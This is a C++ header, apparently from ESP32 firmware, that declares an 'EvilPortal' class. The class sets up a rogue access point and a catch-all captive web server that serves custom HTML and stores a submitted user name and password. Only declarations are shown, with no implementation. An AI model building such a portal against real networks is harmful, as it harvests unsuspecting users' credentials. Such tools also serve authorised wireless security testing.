#ifndef EvilPortal_h
#define EvilPortal_h

#include "ESPAsyncWebServer.h"
#include <AsyncTCP.h>
#include <DNSServer.h>

#include "configs.h"
#include "settings.h"
#ifndef WRITE_PACKETS_SERIAL
  #include "SDInterface.h"
#else
  #include "Buffer.h"
#endif
#include "lang_var.h"

extern Settings settings_obj;
#ifndef WRITE_PACKETS_SERIAL
  extern SDInterface sd_obj;
#endif
extern Buffer buffer_obj; 

#define WAITING 0
#define GOOD 1
#define BAD 2

#define SET_HTML_CMD "sethtml="
#define SET_AP_CMD "setap="
#define RESET_CMD "reset"
#define START_CMD "start"
#define ACK_CMD "ack"
#define MAX_HTML_SIZE 20000
#define MAX_AP_NAME_SIZE 30
#define WIFI_SCAN_EVIL_PORTAL 30

class CaptiveRequestHandler : public AsyncWebHandler {
public:
  CaptiveRequestHandler() {}
  virtual ~CaptiveRequestHandler() {}

  bool canHandle(AsyncWebServerRequest *request) { return true; }

  void handleRequest(AsyncWebServerRequest *request, char * index_html) {
    request->send_P(200, "text/html", index_html);
  }
};

class EvilPortal {

  private:
    bool runServer;
    bool name_received;
    bool password_received;

    String user_name;
    String password;

    char apName[MAX_AP_NAME_SIZE] = "PORTAL";
    char index_html[MAX_HTML_SIZE] = "TEST";

    bool has_html;
    bool has_ap;

    DNSServer dnsServer;

    void (*resetFunction)(void) = 0;

    bool setHtml();
    bool setAP();
    void setupServer();
    void startPortal();
    void startAP();
    void addLog(String log, int len);
    void convertStringToUint8Array(const String& str, uint8_t*& buf, uint32_t& len);

  public:
    EvilPortal();

    String get_user_name();
    String get_password();
    bool begin();
    void main(uint8_t scan_mode);

};

#endif